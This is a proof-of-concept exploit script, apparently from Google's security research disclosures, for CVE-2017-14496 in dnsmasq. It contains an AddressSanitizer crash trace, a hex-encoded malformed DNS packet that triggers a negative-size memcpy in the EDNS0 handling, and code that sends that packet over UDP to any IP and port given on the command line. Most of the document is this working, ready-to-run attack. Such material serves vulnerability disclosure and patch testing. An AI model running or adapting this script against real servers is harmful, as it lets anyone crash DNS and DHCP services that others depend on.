'''
Sources:
https://raw.githubusercontent.com/google/security-research-pocs/master/vulnerabilities/dnsmasq/CVE-2017-14496.py
https://security.googleblog.com/2017/10/behind-masq-yet-more-dns-and-dhcp.html

dnsmasq is vulnerable only if one of the following option is specified: --add-mac, --add-cpe-id or --add-subnet.

=================================================================
==2215==ERROR: AddressSanitizer: negative-size-param: (size=-4)
    #0 0x4b55be in __asan_memcpy (/test/dnsmasq/src/dnsmasq+0x4b55be)
    #1 0x59a70e in add_pseudoheader /test/dnsmasq/src/edns0.c:164:8
    #2 0x59bae8 in add_edns0_config /test/dnsmasq/src/edns0.c:424:12
    #3 0x530b6b in forward_query /test/dnsmasq/src/forward.c:407:20
    #4 0x534699 in receive_query /test/dnsmasq/src/forward.c:1448:16
    #5 0x548486 in check_dns_listeners /test/dnsmasq/src/dnsmasq.c:1565:2
    #6 0x5448b6 in main /test/dnsmasq/src/dnsmasq.c:1044:7
    #7 0x7fb05e3cf2b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)
    #8 0x41cbe9 in _start (/test/dnsmasq/src/dnsmasq+0x41cbe9)

0x62200001ca2e is located 302 bytes inside of 5131-byte region [0x62200001c900,0x62200001dd0b)
allocated by thread T0 here:
    #0 0x4cc700 in calloc (/test/dnsmasq/src/dnsmasq+0x4cc700)
    #1 0x5181b5 in safe_malloc /test/dnsmasq/src/util.c:267:15
    #2 0x54186c in main /test/dnsmasq/src/dnsmasq.c:99:20
    #3 0x7fb05e3cf2b0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x202b0)

SUMMARY: AddressSanitizer: negative-size-param (/test/dnsmasq/src/dnsmasq+0x4b55be) in __asan_memcpy
==2215==ABORTING
'''

#!/usr/bin/python
#
# Copyright 2017 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors:
#  Fermin J. Serna <fjserna@google.com>
#  Felix Wilhelm <fwilhelm@google.com>
#  Gabriel Campana <gbrl@google.com>
#  Kevin Hamacher <hamacher@google.com>
#  Gynvael Coldwin <gynvael@google.com>
#  Ron Bowes - Xoogler :/

import socket
import sys

def negative_size_param():
  data = '''00 00 00 00  00 00 00 00 00 00 00 04
00 00 29 00 00 3a 00 00  00 01 13 fe 32 01 13 79
00 00 00 00 00 00 00 01  00 00 00 61 00 08 08 08
08 08 08 08 08 08 08 08  08 08 08 00 00 00 00 00
00 00 00 6f 29 fb ff ff  ff 00 00 00 00 00 00 00
00 00 03 00 00 00 00 00  00 00 00 02 8d 00 00 00
f9 00 00 00 00 00 00 00  00 00 00 00 5c 00 00 00
01 ff ff 00 35 13 01 0d  06 1b 00 00 00 00 00 00
00 00 00 00 00 04 00 00  29 00 00 3a 00 00 00 01
13 00 08 01 00 00 00 00  00 00 01 00 00 00 61 00
08 08 08 08 08 08 08 08  08 13 08 08 08 00 00 00
00 00 00 00 00 00 6f 29  fb ff ff ff 00 29 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 02 8d 00 00 00 f9  00 00 00 00 00 00 00 00
00 00 00 00 00 01 00 00  00 00 00 00 01 ff ff 00
35 13 00 00 00 00 00 b6  00 00 13 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 61 05
01 20 00 01
'''.replace(' ', '').replace('\n', '').decode('hex')
  return data

if __name__ == '__main__':
  if len(sys.argv) != 3:
    print 'Usage: %s <ip> <port>' % sys.argv[0]
    sys.exit(0)

  ip = sys.argv[1]
  port = int(sys.argv[2])

  packet = negative_size_param()

  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST, 1)
  s.sendto(packet, (ip, port))
  s.close()